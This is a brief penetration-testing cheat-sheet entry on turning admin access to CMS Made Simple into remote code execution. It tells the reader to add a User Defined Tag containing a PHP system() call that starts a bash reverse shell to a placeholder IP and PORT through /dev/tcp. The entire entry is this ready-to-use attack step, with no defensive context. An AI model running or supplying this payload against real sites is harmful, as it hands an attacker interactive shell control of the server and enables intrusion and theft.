# CMS Made Simple (CMSMS)

## RCE&#x20;

Go to **Extensions->User Defined Tags->user\_agent** and add:

```php
echo system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");
```



